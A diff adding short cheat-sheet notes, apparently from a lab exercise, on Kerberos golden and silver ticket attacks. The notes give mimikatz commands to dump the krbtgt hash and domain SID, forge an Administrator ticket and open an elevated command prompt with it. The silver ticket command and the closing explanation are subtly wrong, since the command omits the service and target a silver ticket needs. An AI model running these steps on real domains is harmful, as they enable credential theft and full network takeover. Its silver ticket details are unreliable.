@@ -1,0 +1,29 @@
+Dump the krbtgt hash 
+
+﻿mimikatz.exe :
+
+-privilege::debug - ensure this outputs [privilege '20' ok]
+
+﻿-lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. 
+To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account.
+
+-net user /domain -> (OUTSIDE mimikatz) - Checks all user accounts (including service accounts)
+
+
+Create a Golden/Silver Ticket - 
+
+-Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:500 - Creates a GOLDEN ticket. Input SID, NTLM hash from krbtgt.
+
+-Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:1103 - Creates a SILVER ticket. Input SID, NTLM hash from chosen service.                                                                                       
+
+
+
+Use the Golden/Silver Ticket to access other machines -
+
+﻿-misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.
+
+
+
+Note:
+If you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; 
+however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
